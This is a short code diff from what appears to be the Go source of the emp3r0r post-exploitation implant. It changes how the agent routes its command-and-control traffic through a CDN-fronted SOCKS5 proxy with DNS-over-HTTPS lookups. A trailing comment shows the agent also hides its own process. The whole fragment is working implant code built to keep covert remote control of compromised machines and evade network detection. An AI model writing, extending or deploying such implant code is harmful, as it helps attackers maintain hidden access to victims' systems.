@@ -159,22 +159,22 @@ func main() {
 	if emp3r0r_data.CDNProxy != "" {
 		log.Printf("C2 is behind CDN, using CDNProxy %s", emp3r0r_data.CDNProxy)
 		cdnproxyAddr := fmt.Sprintf("socks5://127.0.0.1:%d", util.RandInt(1024, 65535))
-		emp3r0r_data.AgentProxy = cdnproxyAddr
+		// DoH server
+		dns := "https://9.9.9.9/dns-query"
+		if emp3r0r_data.DoHServer != "" {
+			dns = emp3r0r_data.DoHServer
+		}
+		upper_proxy := emp3r0r_data.AgentProxy
 		go func() {
-			// DoH server
-			dns := "https://9.9.9.9/dns-query"
-			if emp3r0r_data.DoHServer != "" {
-				dns = emp3r0r_data.DoHServer
-			}
-
 			// typically you need to configure AgentProxy manually if agent doesn't have internet
 			// and AgentProxy will be used for websocket connection, then replaced with 10888
-			err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], emp3r0r_data.CDNProxy, emp3r0r_data.AgentProxy, dns)
+			err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], emp3r0r_data.CDNProxy, upper_proxy, dns)
 			if err != nil {
 				log.Fatal(err)
 			}
-			emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", emp3r0r_data.CDNProxy)
 		}()
+		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", emp3r0r_data.CDNProxy)
+		emp3r0r_data.AgentProxy = cdnproxyAddr
 	}
 
 	// hide process of itself if possible
